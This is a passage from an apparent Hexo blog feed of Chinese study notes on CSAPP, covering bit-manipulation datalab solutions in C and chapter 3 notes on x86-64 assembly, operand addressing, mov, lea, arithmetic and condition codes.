class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="2-9-logicalNeg"><a href="#2-9-logicalNeg" class="headerlink" title="2.9 logicalNeg"></a>2.9 logicalNeg</h3><ul>
<li><p>用位运算 实现逻辑非 !</p>
</li>
<li><p>0[0000]  和Tmin[1000] 两个补码特殊</p>
</li>
<li><p>0 的符号位 与其补码符号位 <strong>位或</strong> 为0。 Tmin位或为1  [1000]  [1000]—-利用这一点</p>
</li>
<li><p>代码实现：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * logicalNeg - implement the ! operator, using all of </span></span><br><span class="line"><span class="comment"> *              the legal operators except !</span></span><br><span class="line"><span class="comment"> *   Examples: logicalNeg(3) = 0, logicalNeg(0) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 12</span></span><br><span class="line"><span class="comment"> *   Rating: 4 </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">logicalNeg</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ((x | (~x + <span class="number">1</span>)) &gt;&gt; <span class="number">31</span>) + <span class="number">1</span>;<span class="comment">//左移31后  对于非0数 产生-1[1111] 0产生[0000] 所以+1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="2-10-howManyBits"><a href="#2-10-howManyBits" class="headerlink" title="2.10 howManyBits"></a>2.10 howManyBits</h3><ul>
<li><p>返回最小能表示数字X的补码位数</p>
</li>
<li><p>如果是一个正数，则需要找到它最高的一位（假设是n）是1 的 则在加上符号位， 结果为n+1</p>
</li>
<li><p>如果是负数，则需要知道其最高一位是0的 （例如 -3[1101] 和 -3[101] 表示的是一个值，所以最小需要三位来表示）</p>
</li>
<li><p>代码实现：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* howManyBits - return the minimum number of bits required to represent x in</span></span><br><span class="line"><span class="comment"> *             two&#x27;s complement</span></span><br><span class="line"><span class="comment"> *  Examples: howManyBits(12) = 5</span></span><br><span class="line"><span class="comment"> *            howManyBits(298) = 10</span></span><br><span class="line"><span class="comment"> *            howManyBits(-5) = 4</span></span><br><span class="line"><span class="comment"> *            howManyBits(0)  = 1</span></span><br><span class="line"><span class="comment"> *            howManyBits(-1) = 1</span></span><br><span class="line"><span class="comment"> *            howManyBits(0x80000000) = 32</span></span><br><span class="line"><span class="comment"> *  Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *  Max ops: 90</span></span><br><span class="line"><span class="comment"> *  Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">howManyBits</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> b16, b8, b4, b2, b1, b0;</span><br><span class="line">  <span class="type">int</span> sign = x &gt;&gt; <span class="number">31</span>;<span class="comment">// 取 符号位 如果是负数 则sign为0xFFFFFFFF，否则为0x00000000</span></span><br><span class="line">  <span class="comment">//如果x为正则不变，为负数按位取反（这样好找最高位为1的，原来是最高位为0的，也将符号位去掉了）  </span></span><br><span class="line">  x = (sign &amp; ~x) | (~sign &amp; x);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 二分法 不断缩小范围</span></span><br><span class="line">  b16 = !!(x &gt;&gt; <span class="number">16</span>) &lt;&lt; <span class="number">4</span>;<span class="comment">//高16位是否存在1</span></span><br><span class="line">  x = x &gt;&gt; b16;</span><br><span class="line">  b8 = !!(x &gt;&gt; <span class="number">8</span>) &lt;&lt; <span class="number">3</span>;<span class="comment">//剩余的高8位</span></span><br><span class="line">  x = x &gt;&gt; b8;</span><br><span class="line">  b4 = !!(x &gt;&gt; <span class="number">4</span>) &lt;&lt; <span class="number">2</span>;</span><br><span class="line">  x = x &gt;&gt; b4;</span><br><span class="line">  b2 = !!(x &gt;&gt; <span class="number">2</span>) &lt;&lt; <span class="number">1</span>;</span><br><span class="line">  x = x &gt;&gt; b2;</span><br><span class="line">  b1 = !!(x &gt;&gt; <span class="number">1</span>);</span><br><span class="line">  x = x &gt;&gt; b1;</span><br><span class="line">  b0 = x;</span><br><span class="line">  <span class="keyword">return</span> b16 + b8 + b4 + b2 + b1 + b0 + <span class="number">1</span>; <span class="comment">//+1 是符号位</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p><code>b16 = !!(x &gt;&gt; 16) &lt;&lt; 4;</code>x &gt;&gt; 16 将x 右移16位 丢掉低16位 保留高16位</p>
<ul>
<li><code>！！</code> 常见的技巧，用于将一个数 转换为逻辑值  用来检查移动后的整数是否为0 ，即检查原来高165为是否存在1 。</li>
<li><code>&lt;&lt; 4 </code>如果移动后不为0 那么<code>！！的结果为1</code>，左移4位即 <code>1 &lt;&lt; 4</code> 将其转为相应计数为 <code>16 [1000]</code></li>
</ul>
</li>
<li><p>模拟一下12[00000000,00000000,00000000,00001100]</p>
<ul>
<li>sign &#x3D; 0x00000000  然后x &#x3D; 12[00000000,00000000,00000000,00001100]</li>
<li>b16 &#x3D; 0 ， x &#x3D; [00000000,00000000,00000000,00001100]</li>
<li>b8 &#x3D; 0 ， x &#x3D; [00000000,00000000,00000000,00001100]</li>
<li>b4 &#x3D; 0， x&#x3D; [00000000,00000000,00000000,00001100]</li>
<li>b2 &#x3D;2[10]  , x &#x3D;  [00000000,00000000,00000000,00000011]</li>
<li>b1 &#x3D; 1[1] , x &#x3D;  [00000000,00000000,00000000,00000001]</li>
<li>b0 &#x3D; 1 ,</li>
<li>return 2+1+1+1 &#x3D; 5</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="2-11-floatScale2"><a href="#2-11-floatScale2" class="headerlink" title="2.11 floatScale2"></a>2.11 floatScale2</h3><ul>
<li><p>求2乘以一个浮点数    若uf为NaN 或无穷大 则直接返回   否则计算uf * 2返回。</p>
</li>
<li><p>特殊情况： 无穷小 、 0 、 无穷大和非数值NaN  此时这些浮点数的指数部分分别存储为 0、 0、 255 、255，因此无穷大和NaN则直接返回就行，无穷小和0只需要在原数乘二然后再加上符号位就可以（因为不会越界）</p>
</li>
<li><p>代码实现：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//float</span></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * floatScale2 - Return bit-level equivalent of expression 2*f for</span></span><br><span class="line"><span class="comment"> *   floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Both the argument and result are passed as unsigned int&#x27;s, but</span></span><br><span class="line"><span class="comment"> *   they are to be interpreted as the bit-level representation of</span></span><br><span class="line"><span class="comment"> *   single-precision floating point values.</span></span><br><span class="line"><span class="comment"> *   When argument is NaN, return argument</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="title">floatScale2</span><span class="params">(<span class="type">unsigned</span> uf)</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> sign = uf &amp; (<span class="number">1</span> &lt;&lt; <span class="number">31</span>);<span class="comment">//符号位</span></span><br><span class="line">  <span class="type">int</span> exp = (uf &amp; <span class="number">0x7f800000</span>) &gt;&gt; <span class="number">23</span>; <span class="comment">//0x7f800000 浮点数最大值  与uf做于 截取出 exp的数据</span></span><br><span class="line">  <span class="comment">//特殊情况</span></span><br><span class="line">  <span class="keyword">if</span> (exp == <span class="number">0</span>) <span class="keyword">return</span> uf &lt;&lt; <span class="number">1</span> | sign;<span class="comment">//指数为0  直接返回乘以2 的值 左移一个即乘以2</span></span><br><span class="line">  <span class="keyword">if</span> (exp == <span class="number">255</span>) <span class="keyword">return</span> uf;<span class="comment">//无穷大或NaN 直接返回</span></span><br><span class="line">  exp++;<span class="comment">//指数加一，相当于乘二 相当于左移一位</span></span><br><span class="line">  <span class="keyword">if</span> (exp == <span class="number">255</span>) <span class="keyword">return</span> <span class="number">0x7f800000</span> | sign; <span class="comment">//指数加一后为255 </span></span><br><span class="line">  <span class="keyword">return</span> (exp &lt;&lt; <span class="number">23</span>) | (uf &amp; <span class="number">0x807fffff</span>); <span class="comment">//否则 返回指数+1后和 原来数其他位的结果 也就是乘以2的结果</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="2-12-floatFloat2Int"><a href="#2-12-floatFloat2Int" class="headerlink" title="2.12 floatFloat2Int"></a>2.12 floatFloat2Int</h3><ul>
<li><p>实现 (int)uf  将浮点数转为整数</p>
</li>
<li><p>溢出 返回0x80000000u   </p>
</li>
<li><p>偏置值127 在单精度浮点数中 偏置值为2^(k-1)-1，其中单精度指数部分占了 8为 所以 2^（8-1）-1&#x3D;127</p>
</li>
<li><p>在单精度浮点表示中，<strong>尾数（即有效数字）部分的位数是 23 位</strong>。当对浮点数进行整数转换时，需要考虑到指数部分的影响。如果指数部分大于 23，意味着尾数部分需要左移，以便将小数部分转换为整数。</p>
<p>这是因为指数的值实际上代表了小数点向左或向右移动的位数。<strong>如果指数大于 23，表示小数点要向左移动超过尾数部分的位数，</strong>因此需要将尾数左移，以保留整数部分。左移的位数是指数值减去 23，因为每左移一位，相当于乘以 2 的一次方。</p>
</li>
<li><p>代码实现：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * floatFloat2Int - Return bit-level equivalent of expression (int) f</span></span><br><span class="line"><span class="comment"> *   for floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Argument is passed as unsigned int, but</span></span><br><span class="line"><span class="comment"> *   it is to be interpreted as the bit-level representation of a</span></span><br><span class="line"><span class="comment"> *   single-precision floating point value.</span></span><br><span class="line"><span class="comment"> *   Anything out of range (including NaN and infinity) should return</span></span><br><span class="line"><span class="comment"> *   0x80000000u.</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">floatFloat2Int</span><span class="params">(<span class="type">unsigned</span> uf)</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> sign = uf &gt;&gt; <span class="number">31</span>;<span class="comment">//符号位</span></span><br><span class="line">  <span class="type">int</span> exp = ((uf &amp; <span class="number">0x7f800000</span>) &gt;&gt; <span class="number">23</span>) <span class="number">-127</span>;<span class="comment">//-127 偏置值</span></span><br><span class="line">  <span class="type">int</span> frac = (uf &amp; <span class="number">0x007fffff</span>) | <span class="number">0x00800000</span>; <span class="comment">//尾数 并且补上隐藏的1 得到完整的整数</span></span><br><span class="line">  <span class="keyword">if</span> (!(uf &amp; <span class="number">0x7fffffff</span>)) <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//如果uf=0 则return 0</span></span><br><span class="line">  <span class="keyword">if</span> (exp &gt; <span class="number">31</span>) <span class="keyword">return</span> <span class="number">0x80000000</span>; <span class="comment">//如果指数大于31 则返回溢出值 因为整数int为32位</span></span><br><span class="line">  <span class="keyword">if</span> (exp &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//指数小于0 小数部分无法表示 返回0</span></span><br><span class="line">    </span><br><span class="line">  <span class="keyword">if</span> (exp &gt; <span class="number">23</span>) frac &lt;&lt;= (exp - <span class="number">23</span>);<span class="comment">//exp大于23   需要将小数位左移</span></span><br><span class="line">  <span class="keyword">else</span> frac &gt;&gt;= (<span class="number">23</span> - exp);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!((frac &gt;&gt; <span class="number">31</span>) ^ sign)) <span class="keyword">return</span> frac; <span class="comment">//符号相同则返回原值</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (frac &gt;&gt; <span class="number">31</span>) <span class="keyword">return</span> <span class="number">0x80000000</span>;<span class="comment">//如果为负（即原来为正），返回溢出值</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">return</span> ~frac + <span class="number">1</span>;<span class="comment">//如果为正（原来为负），返回相反数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="2-13-floatPower2"><a href="#2-13-floatPower2" class="headerlink" title="2.13 floatPower2"></a>2.13 floatPower2</h3><ul>
<li><p>求2.0^x</p>
</li>
<li><p>exp &lt;&#x3D; 0 指数部分太小 而无法用单精度浮点数表示 </p>
</li>
<li></li>
<li><p>代码实现：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * floatPower2 - Return bit-level equivalent of the expression 2.0^x</span></span><br><span class="line"><span class="comment"> *   (2.0 raised to the power x) for any 32-bit integer x.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   The unsigned value that is returned should have the identical bit</span></span><br><span class="line"><span class="comment"> *   representation as the single-precision floating-point number 2.0^x.</span></span><br><span class="line"><span class="comment"> *   If the result is too small to be represented as a denorm, return</span></span><br><span class="line"><span class="comment"> *   0. If too large, return +INF.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. Also if, while </span></span><br><span class="line"><span class="comment"> *   Max ops: 30 </span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="title">floatPower2</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> exp = x + <span class="number">127</span>; <span class="comment">//把x当作真指数</span></span><br><span class="line">  <span class="keyword">if</span> (exp &lt;= <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 0 &lt; 原数&lt;1 返回0</span></span><br><span class="line">  <span class="keyword">if</span> (exp &gt;= <span class="number">255</span>) <span class="keyword">return</span> <span class="number">0x7f800000</span>;<span class="comment">//溢出</span></span><br><span class="line">  <span class="keyword">return</span> exp &lt;&lt;<span class="number">23</span>; <span class="comment">//否则x作为正常的数 有效范围 则exp 左移23位  将指数部分放在合适的位数上</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​</p>
</li>
</ul>
<p>	</p>
]]></content>
      <categories>
        <category>CSAPP</category>
      </categories>
      <tags>
        <tag>datalab</tag>
      </tags>
  </entry>
  <entry>
    <title>CSAPP-3-textbook</title>
    <url>/2023/10/18/CSAPP-3-textbook/</url>
    <content><![CDATA[<h1 id="第三章：程序的机器级表示"><a href="#第三章：程序的机器级表示" class="headerlink" title="第三章：程序的机器级表示"></a>第三章：程序的机器级表示</h1><h2 id="3-2程序编码"><a href="#3-2程序编码" class="headerlink" title="3.2程序编码"></a>3.2程序编码</h2><ol>
<li><code>gcc -og -o p p1.c p2.c</code>用gcc编译p1和p2两个c文件</li>
<li>首先<em>c预处理器</em>扩展源代码，插入所有用#include 命令的指定文件 ，并且扩展所有用#define 声明指定的宏。</li>
<li>其次，<em>编译器</em>产生两个源文件的汇编代码，分别命名为p1.s和p2.s.</li>
<li>再然后，<em>汇编器</em>会将汇编代码转换为二进制目标代码文件p1.o和p2.o。目标代码是机器代码的一种形式，包含所有指令的二进制表示，但是还没有填入全局值的地址。</li>
<li>最后，<em>链接器</em>将两个目标代码文件与库函数的代码（例如printf）合并，并最终产生可执行代码文件p。</li>
</ol>
<h3 id="3-2-1-机器级代码"><a href="#3-2-1-机器级代码" class="headerlink" title="3.2.1 机器级代码"></a>3.2.1 机器级代码</h3><ul>
<li>一般来说对于机器级编程，两种抽象尤为重要：<ul>
<li>指令集架构<code>ISA</code> 定义了处理器的状态，指令的格式。。。</li>
<li>机器级程序使用的内存地址是虚拟地址。</li>
</ul>
</li>
</ul>
<h3 id="3-2-2-代码示例"><a href="#3-2-2-代码示例" class="headerlink" title="3.2.2 代码示例"></a>3.2.2 代码示例</h3><ul>
<li><code>objdump -d 文件名</code>反汇编器，用于查看汇编代码</li>
<li><img src="/2023/10/18/CSAPP-3-textbook/image-20231019154138226.png" alt="objdump"></li>
<li><img src="/2023/10/18/CSAPP-3-textbook/image-20231019154338326.png" alt="image-20231019154338326"></li>
<li><img src="/2023/10/18/CSAPP-3-textbook/image-20231019160312889.png" alt="image-20231019160312889"></li>
</ul>
<h3 id="3-2-3-关于格式的注解"><a href="#3-2-3-关于格式的注解" class="headerlink" title="3.2.3 关于格式的注解"></a>3.2.3 关于格式的注解</h3><ul>
<li><img src="/2023/10/18/CSAPP-3-textbook/image-20231019160653506.png" alt="image-20231019160653506"></li>
</ul>
<h2 id="3-3-数据格式"><a href="#3-3-数据格式" class="headerlink" title="3.3 数据格式"></a>3.3 数据格式</h2><ul>
<li><img src="/2023/10/18/CSAPP-3-textbook/image-20231019161223328.png" alt="x86-64中c语言数据类型占字节大小"></li>
<li>汇编指令中用后缀表示操作数的大小：例如movb（传送字节）、movw（传送字）、movl（传送双字）、movq（传送四字）。</li>
</ul>
<h2 id="3-4-访问信息"><a href="#3-4-访问信息" class="headerlink" title="3.4 访问信息"></a>3.4 访问信息</h2><ul>
<li>一个x86-64的cpu 包含一组16 个存储64位值的<em>通用目的存储器</em>，用来存储整数数据和指针。它们的名字都以%r开头。</li>
<li><img src="/2023/10/18/CSAPP-3-textbook/image-20231019162125984.png" alt="x86-64-通用寄存器"></li>
</ul>
<h3 id="3-4-1操作数指示符"><a href="#3-4-1操作数指示符" class="headerlink" title="3.4.1操作数指示符"></a>3.4.1操作数指示符</h3><ul>
<li><p><code>Imm(rb, ri, s)</code>：一个立即数偏移，一个基址寄存器rb，一个变址寄存器ri，和一个比例因子s，这里s必须是1，2，4或者8。<strong>有效地址被计算为Imm + R[rb] + R[ri] * s</strong>。</p>
</li>
<li><p><img src="/2023/10/18/CSAPP-3-textbook/image-20231019163106993.png" alt="操作数格式"></p>
</li>
<li><p>习题3.1 假设下面的值存放在指明的内存地址和寄存器中：</p>
<ul>
<li><p><img src="/2023/10/18/CSAPP-3-textbook/image-20231019163420728.png" alt="习题3.1"></p>
</li>
<li><table>
<thead>
<tr>
<th align="center">操作数</th>
<th align="center">值</th>
<th align="center">注释</th>
</tr>
</thead>
<tbody><tr>
<td align="center">%rax</td>
<td align="center">0x100</td>
<td align="center">寄存器</td>
</tr>
<tr>
<td align="center">0x104</td>
<td align="center">0xAB</td>
<td align="center">绝对地址</td>
</tr>
<tr>
<td align="center">$0x108</td>
<td align="center">0x108</td>
<td align="center">立即数</td>
</tr>
<tr>
<td align="center">(%rax)</td>
<td align="center">0xFF</td>
<td align="center">地址0x100</td>
</tr>
<tr>
<td align="center">4(%rax)</td>
<td align="center">0xAB</td>
<td align="center">地址（4+0x100）</td>
</tr>
<tr>
<td align="center">9(%rax, %rdx)</td>
<td align="center">0x11</td>
<td align="center">地址（9+0x100+0x3）&#x3D;0x10c</td>
</tr>
<tr>
<td align="center">260(%rcx, %rdx)</td>
<td align="center">0x13</td>
<td align="center">地址（260+0x1+0x3）&#x3D;0x108</td>
</tr>
<tr>
<td align="center">0xFC(, %rcx, 4)</td>
<td align="center">0xFF</td>
<td align="center">地址（0xFC+0x1*4）&#x3D;0x100</td>
</tr>
<tr>
<td align="center">(%rax, %rdx,4)</td>
<td align="center">0x11</td>
<td align="center">地址（0x100+0x3*4）&#x3D;0x10c</td>
</tr>
</tbody></table>
</li>
</ul>
</li>
</ul>
<h3 id="3-4-2-数据传送指令"><a href="#3-4-2-数据传送指令" class="headerlink" title="3.4.2 数据传送指令"></a>3.4.2 数据传送指令</h3><p>MOV指令：</p>
<ul>
<li><p><img src="/2023/10/18/CSAPP-3-textbook/image-20231020145113889.png" alt="mov"></p>
</li>
<li><p>X86-64 增加了一条限制，即传送指令的两个操作数不能都指向内存位置。即需要两条指令先加载到寄存器中才能完成。</p>
</li>
<li><p><img src="/2023/10/18/CSAPP-3-textbook/image-20231020145957104.png" alt="image-20231020145957104"></p>
</li>
</ul>
<p>习题3.2：补充指令后缀</p>
<ul>
<li><table>
<thead>
<tr>
<th align="center">movl（%eax—32位 双字）</th>
<th align="center">%eax，(%rsp)</th>
</tr>
</thead>
<tbody><tr>
<td align="center">movw（%dx—16位 字）</td>
<td align="center">(%rax)，%dx</td>
</tr>
<tr>
<td align="center">movb（%bl—8位 字节）</td>
<td align="center">$0xFF，%bl</td>
</tr>
<tr>
<td align="center">movb（%dl—8位 字节）</td>
<td align="center">(%rsp,%rdx,4)，%dl</td>
</tr>
<tr>
<td align="center">movq（%rax–64位 四字）</td>
<td align="center">(%rdx)，%rax</td>
</tr>
<tr>
<td align="center">movw（%dx–16位 字）</td>
<td align="center">%dx，(%rax)</td>
</tr>
</tbody></table>
</li>
<li><p>x86-64的内存引用总是用4个字的寄存器表示（%rax） 无论操作多长都是四个字</p>
</li>
</ul>
<p>习题3.3：解释每一行哪里出错</p>
<ul>
<li><table>
<thead>
<tr>
<th align="center">movb $0xF，(%ebx)</th>
<th align="center">修改为%ebx—不能用括号取寄存器中的值，只有存储器中的才能</th>
</tr>
</thead>
<tbody><tr>
<td align="center">movl %rax，(%rsp）</td>
<td align="center">修改为movl—%rax 是四字 前缀和寄存器大小不匹配</td>
</tr>
<tr>
<td align="center">movw(%rax),4(%rsp)</td>
<td align="center">修改为&amp;rax—不能将内存中的值移动到内存中</td>
</tr>
<tr>
<td align="center">movb %al,%sl</td>
<td align="center">没有%sl</td>
</tr>
<tr>
<td align="center">movq %rax,$0x123</td>
<td align="center">destination不能是立即数</td>
</tr>
<tr>
<td align="center">movl %eax,%rdx</td>
<td align="center">%rdx为8字节，%eax为4字节 不能移动不相等长度的数据</td>
</tr>
<tr>
<td align="center">movb %si，8(%rbp)</td>
<td align="center">&amp;si 是字—两个字节</td>
</tr>
</tbody></table>
</li>
</ul>
<h3 id="3-4-3-数据传送示例"><a href="#3-4-3-数据传送示例" class="headerlink" title="3.4.3 数据传送示例"></a>3.4.3 数据传送示例</h3><ul>
<li><img src="/2023/10/18/CSAPP-3-textbook/image-20231020160448602.png" alt="exchange函数c代码与汇编代码"></li>
</ul>
<h3 id="3-4-4-压入和弹出栈数据"><a href="#3-4-4-压入和弹出栈数据" class="headerlink" title="3.4.4 压入和弹出栈数据"></a>3.4.4 压入和弹出栈数据</h3><ul>
<li>栈：先进后出  弹出和压入的一端叫做栈顶<ul>
<li><img src="/2023/10/18/CSAPP-3-textbook/image-20231020161208555.png" alt="出栈和入栈指令"></li>
</ul>
</li>
<li>栈顶元素的地址是所有栈中元素地址最低的 （一般来说 栈是倒过来画的，栈顶在图的底部）<ul>
<li><img src="/2023/10/18/CSAPP-3-textbook/image-20231020161429179.png" alt="image-20231020161429179"></li>
</ul>
</li>
</ul>
<h2 id="3-5-算术和逻辑操作"><a href="#3-5-算术和逻辑操作" class="headerlink" title="3.5 算术和逻辑操作"></a>3.5 算术和逻辑操作</h2><ul>
<li>整数算数操作<ul>
<li><img src="/2023/10/18/CSAPP-3-textbook/image-20231020161908320.png" alt="整数算数操作"></li>
</ul>
</li>
</ul>
<h3 id="3-5-1-加载有效地址"><a href="#3-5-1-加载有效地址" class="headerlink" title="3.5.1 加载有效地址"></a>3.5.1 加载有效地址</h3><ul>
<li>leaq（load effective address） 实际上上movq指令的变形，他的指令形式是从内存读数据到寄存器</li>
<li>其目的操作数必须是一个寄存器</li>
<li><img src="/2023/10/18/CSAPP-3-textbook/image-20231020162517186.png" alt="image-20231020162517186"></li>
<li>leaq 指令能够执行加法和有限形式的乘法<ul>
<li><img src="/2023/10/18/CSAPP-3-textbook/image-20231020162817959.png" alt="image-20231020162817959"></li>
</ul>
</li>
</ul>
<h4 id="习题3-6"><a href="#习题3-6" class="headerlink" title="习题3.6"></a>习题3.6</h4><p>假设寄存器&amp;rax的值为x，%rcx的值为y，填写下表指明下面每一条汇编代码指令存储在寄存器%rdx的值</p>
<table>
<thead>
<tr>
<th align="center">表达式</th>
<th align="center">结果</th>
</tr>
</thead>
<tbody><tr>
<td align="center">leaq 6(%rax),%rdx</td>
<td align="center">6+x</td>
</tr>
<tr>
<td align="center">leaq (%rax,%rcx),%rdx</td>
<td align="center">x+y</td>
</tr>
<tr>
<td align="center">leaq(%rax,%rcx，4),%rdx</td>
<td align="center">x+4y</td>
</tr>
<tr>
<td align="center">leaq 7(%rax,%rax,8),%rdx</td>
<td align="center">7+x+8x</td>
</tr>
<tr>
<td align="center">leaq0xA(,%rcx，4),%rdx</td>
<td align="center">10+4y</td>
</tr>
<tr>
<td align="center">leaq 9(%rax,%rcx,2),%rdx</td>
<td align="center">9+x+2y</td>
</tr>
</tbody></table>
<h4 id="习题3-7"><a href="#习题3-7" class="headerlink" title="习题3.7"></a>习题3.7</h4><p>补充省略的表达式</p>
<p><img src="/2023/10/18/CSAPP-3-textbook/image-20231020164353256.png" alt="3.7"></p>
<ul>
<li>第一条指令 ：x+4x&#x3D;5x—&gt;放入%rax</li>
<li>第二条： 5x+2y —&amp;rax</li>
<li>第三条： <code>5x+2y+8z</code></li>
</ul>
<h3 id="3-5-2-一元操作和二元操作"><a href="#3-5-2-一元操作和二元操作" class="headerlink" title="3.5.2 一元操作和二元操作"></a>3.5.2 一元操作和二元操作</h3><ul>
<li>一元操作：只有一个操作数 既是源又是目的 这个操作数可以是一个寄存器也可以是一个内存位置</li>
</ul>
<p><img src="/2023/10/18/CSAPP-3-textbook/image-20231020165128980.png" alt="一元"></p>
<ul>
<li>二元操作：第二个操作数是源又是目的。 源操作数是第一个，目的操作数是第二个。第一个操作数可以是立即数、寄存器和内存地址，第二个操作数可以说寄存器和内存地址</li>
</ul>
<p><img src="/2023/10/18/CSAPP-3-textbook/image-20231020165228900.png" alt="二元"></p>
<h4 id="习题3-8"><a href="#习题3-8" class="headerlink" title="习题3.8"></a>习题3.8</h4><ul>
<li>参考：<a href="https://blog.csdn.net/ciqingloveless/article/details/84338834">深入理解计算机系统 练习题3.8 理解计算机二元操作-CSDN博客</a></li>
</ul>
<p><strong><img src="/2023/10/18/CSAPP-3-textbook/image-20231020165447772.png" alt="image-20231020165447772"></strong></p>
<p>填写下表：</p>
<table>
<thead>
<tr>
<th align="center">指令</th>
<th align="center">目的</th>
<th align="center">值</th>
</tr>
</thead>
<tbody><tr>
<td align="center">addq %rcx，(%rax)</td>
<td align="center">0x100（%rcx+0x100&#x3D;0x100）</td>
<td align="center">0x100</td>
</tr>
<tr>
<td align="center">subq %rdx,8(%rax)</td>
<td align="center">0x108(0x100+8-%rdx&#x3D;0x108)</td>
<td align="center">0xA8</td>
</tr>
<tr>
<td align="center">imulq $16,(%rax,%rdx,8)</td>
<td align="center">0x118</td>
<td align="center">0x110</td>
</tr>
<tr>
<td align="center">incq 16(%rax)</td>
<td align="center">0x110（有括号 ）</td>
<td align="center">0x14(0x13+1)</td>
</tr>
<tr>
<td align="center">decq %rcx</td>
<td align="center">%rcx</td>
<td align="center">0x1-1&#x3D;0x0</td>
</tr>
<tr>
<td align="center">subq %rdx,%rax</td>
<td align="center">%rax(无括号)</td>
<td align="center">0x100-0x3&#x3D;0xFD</td>
</tr>
</tbody></table>
<ul>
<li>加括号时取值 不加括号就表示寄存器</li>
<li><code>imulq $16, (%rax, %rdx, 8)</code><ul>
<li>s-&gt;$16-&gt;16</li>
<li>d-&gt;(%rax,%rdx,8) -&gt; (%rax+8*%rdx )-&gt; 0x100+0x18（十进制24） -&gt; 0x118 —–&gt; 0x11</li>
<li>0x11*16(十进制)&#x3D;0x11 * 0x10&#x3D;0x110</li>
</ul>
</li>
</ul>
<h3 id="3-5-3-移位操作"><a href="#3-5-3-移位操作" class="headerlink" title="3.5.3 移位操作"></a>3.5.3 移位操作</h3><ul>
<li>移位量可以是一个立即数，或者放在单字节寄存器&amp;cl中。（只允许以这个特定的寄存器作为操作数）</li>
<li>左移指令：SAL和SHL两者效果是一样的</li>
<li>但是右移指令：SAR执行算数移位（填上符号位），SHR执行逻辑移位（填上0）。</li>
<li><img src="/2023/10/18/CSAPP-3-textbook/image-20231021193219883.png" alt="image-20231021193219883"></li>
</ul>
<h2 id="3-6-控制"><a href="#3-6-控制" class="headerlink" title="3.6 控制"></a>3.6 控制</h2><ul>
<li>机器代码提供两种基本的低级机制来实现有条件的行为：测试数据值，然后根据测试的结果来改变控制流或者数据流。</li>
</ul>
<h3 id="3-6-1-条件码"><a href="#3-6-1-条件码" class="headerlink" title="3.6.1 条件码"></a>3.6.1 条件码</h3><ul>
<li>常用的条件码：<ul>
<li><img src="/2023/10/18/CSAPP-3-textbook/image-20231022151140133.png" alt="条件码"></li>
</ul>
</li>
<li>leaq指令不改变任何条件码，因为它是用来进行地址计算的</li>
<li><img src="/2023/10/18/CSAPP-3-textbook/image-20231022151549298.png" alt="只设置条件码，不改变任何寄存器的值"></li>
</ul>
<h3 id="3-6-2-访问条件码"><a href="#3-6-2-访问条件码" class="headerlink" title="3.6.2 访问条件码"></a>3.6.2 访问条件码</h3><ul>
<li><p>set 指令</p>
<ul>
<li><img src="/2023/10/18/CSAPP-3-textbook/image-20231022152041921.png" alt="set"></li>
</ul>
</li>
